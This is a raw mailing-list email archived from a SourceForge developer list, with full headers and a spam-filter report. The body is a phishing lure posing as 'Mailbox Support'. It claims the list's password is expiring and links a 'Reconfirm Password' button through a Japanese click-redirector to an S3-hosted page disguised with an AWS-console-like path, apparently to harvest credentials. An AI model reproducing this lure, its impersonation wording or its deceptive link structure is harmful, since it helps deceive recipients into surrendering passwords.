Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 2A19BB59571
	for <lists+industrypack-devel@lfdr.de>; Tue, 16 Sep 2025 13:42:28 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=2tURMDZrhP84mRm3UH8gbAbj9UbCfxOdxlWsgOXHtkw=; b=GpeTo87LFLNlNti9PsQ+m4O9Mn
	WlgSZBm+0Jdzwx3/DelqqRLDL0g7EJhpmIdp4ILZiut7Lgm45AkTn0OleBQPauSx5Df5OfNZQRdDZ
	vxBS3JRiIoD5zdsy86B91aEL+ONts6KG5Hrsjmt/BJyaOlojKJ17ZcG7PjU/QAVI1hjU=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1uyU4o-0000oy-UP
	for lists+industrypack-devel@lfdr.de;
	Tue, 16 Sep 2025 11:42:26 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <a.stod@ntlworld.com>) id 1uyU4n-0000om-3e
 for industrypack-devel@lists.sourceforge.net;
 Tue, 16 Sep 2025 11:42:25 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=mNo9yB1iY4ujksNWOyaC4+J/CCaDY8rjIJsEzbr24ow=; b=kNhOP8gPd2AHoq3MJac9dpi3RZ
 sALMt7tSeupi2G6oSYKl6BaGxFrC42pFe35tURT7b3LYM+W3ewCMKF7kZkOjNPWJkruVKZtNCqmTO
 k+hNVj5YhHMGzu0C+b37NNcYTz8IrEVCbixhmb5aJa11xL39t6Ov7g2yiqpMgnrcdeqs=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=mNo9yB1iY4ujksNWOyaC4+J/CCaDY8rjIJsEzbr24ow=; b=O
 K+twZwtqh1MEzgtlxS1/m31t2Sfho+L1HW5dOtoejds9ymRc+uO0tF1mtOArgWi32tKHR847xuIvV
 MyP+QybZBZ7/17NQustFrCJt3Eq4vo/vxCYMRN4NbKkI3xcN/xp810mGrHq4JGUdBVadTWcmlmfdt
 G4H+9DdIia6vdd/4=;
Received: from [216.250.252.33] by sfi-mx-2.v28.lw.sourceforge.com with esmtp 
 (Exim 4.95) id 1uyU4l-00045k-Np
 for industrypack-devel@lists.sourceforge.net;
 Tue, 16 Sep 2025 11:42:25 +0000
To: industrypack-devel@lists.sourceforge.net
Date: 16 Sep 2025 04:42:10 -0700
Message-ID: <20250916044209.530D22AA379FF032@ntlworld.com>
MIME-Version: 1.0
X-Spam-Score: 5.4 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: industrypack-devel@lists.sourceforge.net Verification
 9/16/2025
 4:42:09 a.m. Hi industrypack-devel@lists.sourceforge.net, 
 Content analysis details:   (5.4 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 4.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [216.250.252.33 listed in dnsbl-1.uceprotect.net]
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 HTML_FONT_TINY_NORDNS  Font too small to read, no rDNS
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1uyU4l-00045k-Np
Subject: [Industrypack-devel] [SPAM] #Action Required: Avoid Mailbox Shutdown
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Mailbox Support via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: Mailbox Support <a.stod@ntlworld.com>
Content-Type: multipart/mixed; boundary="===============8695318137377746596=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============8695318137377746596==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><div tabindex=3D"1" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" i=
d=3D":t3" role=3D"textbox" aria-expanded=3D"false" aria-controls=3D":1bv" a=
ria-owns=3D":1bv" style=3D"direction: ltr; min-height: 409px;" contentedita=
ble=3D"true" hidefocus=3D"true" spellcheck=3D"false" aria-label=3D"Message =
Body" aria-multiline=3D"true" itacorner=3D"6,7:1,1,0,0" g_editable=3D"true"=
 writingsuggestions=3D"false"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D=
"ltr"><div dir=3D"ltr"><div dir=3D"ltr">

<div style=3D"padding: 0px; color: rgb(34, 34, 34); font-family: Roboto,Rob=
otoDraft,Helvetica,Arial,sans-serif; font-size: medium; border-left-color: =
currentColor; border-left-width: medium; border-left-style: none; display: =
flex;">
<div style=3D"margin: 0px; padding: 0px 0px 20px; width: 1290px;">
<div id=3D"m_-2389165102632629982m_-2862337059400665245m_298147033688663844=
m_-8429174289056822736m_-7929704800997416724m_-39798808527363889m_906019004=
1860497799m_-2427145531831029646m_5268039451863485029m_-1310768584506492804=
m_985345383777259521m_6045255725945160625m_-7684109771908007727m_3521334025=
784030328m_-914471003173216367m_-5511476127193352846m_-5778870440113700472m=
_6059766239131675564gmail-m_-4036548085837248123m_-4288977199800308422m_351=
4033325870818030m_8619773795691599890gmail-:36b"=20
style=3D"margin: 8px 0px 0px; padding: 0px; direction: ltr;">
<div id=3D"m_-2389165102632629982m_-2862337059400665245m_298147033688663844=
m_-8429174289056822736m_-7929704800997416724m_-39798808527363889m_906019004=
1860497799m_-2427145531831029646m_5268039451863485029m_-1310768584506492804=
m_985345383777259521m_6045255725945160625m_-7684109771908007727m_3521334025=
784030328m_-914471003173216367m_-5511476127193352846m_-5778870440113700472m=
_6059766239131675564gmail-m_-4036548085837248123m_-4288977199800308422m_351=
4033325870818030m_8619773795691599890gmail-:36a"=20
style=3D"line-height: 1.5; overflow: hidden; font-family: Arial,Helvetica,s=
ans-serif; font-size: small; font-stretch: normal; font-variant-numeric: no=
rmal; font-variant-east-asian: normal;">
<table style=3D"margin: auto; width: 550px;" border=3D"0" cellspacing=3D"0"=
 cellpadding=3D"0">
<tbody>
<tr>
<td style=3D"margin: 0px; font-family: Roboto,RobotoDraft,Helvetica,Arial,s=
ans-serif;">
<table style=3D"width: 550px;" border=3D"0" cellspacing=3D"0" cellpadding=
=3D"0">
<tbody>
<tr>
<td style=3D"margin: 0px; height: 4px; line-height: 4px; font-size: 4px; ba=
ckground-color: rgb(102, 102, 102);">&nbsp;</td></tr>
<tr>
<td style=3D"margin: 0px;">
<table style=3D"background: rgb(246, 246, 246); border: 1px solid rgb(204, =
204, 204); width: 550px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=

<thead>
<tr>
<th style=3D"padding: 15px 10px 15px 20px; text-align: left; color: rgb(51,=
 51, 51); font-family: calibri,helvetica,arial,sans-serif; font-size: 18px;=
 font-weight: normal;">&nbsp;industrypack-devel@lists.sourceforge.net <span=
 style=3D"font-weight: 600;"></span><span style=3D"font-style: italic;">Ver=
ification</span></th>
<th style=3D"padding: 15px 20px 15px 10px; text-align: right; color: rgb(51=
, 51, 51); font-family: calibri,helvetica,arial,sans-serif; font-size: 13px=
; font-weight: normal;">9/16/2025 4:42:09 a.m.<br></th></tr></thead>
<tbody>
<tr>
<td style=3D"margin: 0px; padding: 0px 20px 20px;" colspan=3D"2">
<table style=3D"background: rgb(255, 255, 255); width: 508px;" border=3D"0"=
 cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td style=3D"margin: 0px; padding: 6px 0px 6px 20px; width: 488px; font-fam=
ily: calibri,helvetica,arial,sans-serif; font-size: 16px;">
<p style=3D"color: rgb(102, 102, 102);">Hi industrypack-devel@lists.sourcef=
orge.net,</p>
<p><span style=3D"color: rgb(102, 102, 102);">Your </span><font color=3D"#0=
000ff">industrypack-devel@lists.sourceforge.net</font><span style=3D"color:=
 rgb(102, 102, 102);"> account password will expire on 9/16/2025 4:42:09 a.=
m.</span><br><span style=3D"color: rgb(102, 102, 102);">To=20
continue using your</span><span style=3D"color: rgb(102, 102, 102);"> accou=
nt, Please reconfirm=20
below.</span></p>
<table style=3D"color: rgb(102, 102, 102);" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0">
<tbody>
<tr>
<td style=3D"background: rgb(32, 113, 197); margin: 0px; padding: 9px 15px;=
 border-radius: 2px; font-family: Roboto,RobotoDraft,Helvetica,Arial,sans-s=
erif;">
<center>
<a style=3D"color: rgb(255, 255, 255); font-family: calibri,helvetica,arial=
,sans-serif; font-size: 14px; text-decoration-line: none;" href=3D"https://=
www.e-click.jp/redirects/direct/10087/1637/?url=3Dhttps://s3.us-east-1.amaz=
onaws.com/aa-north-2.console.aws.amazon.com001/MonotomicXindex.html?#indust=
rypack-devel@lists.sourceforge.net" target=3D"_blank"=20
data-saferedirecturl=3D"https://www.e-click.jp/redirects/direct/10087/1637/=
?url=3Dhttps://s3.us-east-1.amazonaws.com/aa-north-2.console.aws.amazon.com=
001/MonotomicXindex.html?#industrypack-devel@lists.sourceforge.net">Reconfi=
rm Password</a></center></td></tr></tbody></table>
<p style=3D"color: rgb(102, 102, 102);">lists.sourceforge.net Mail=20
Team</p></td></tr></tbody></table></td></tr></tbody>
<tfoot>
<tr>
<td style=3D"margin: 0px; color: rgb(102, 102, 102); padding-right: 20px; p=
adding-bottom: 15px; padding-left: 20px; font-family: calibri,helvetica,ari=
al,sans-serif; font-size: 12px;" colspan=3D"2">Message securely sent to ind=
ustrypack-devel@lists.sourceforge.net, please ignore if wrongly=20
received.</td></tr></tfoot></table></td></tr></tbody></table></td></tr></tb=
ody></table></div></div></div></div></div>
</div>
</div>
</div>
</div>
</div>
</body></html>


--===============8695318137377746596==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8695318137377746596==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============8695318137377746596==--
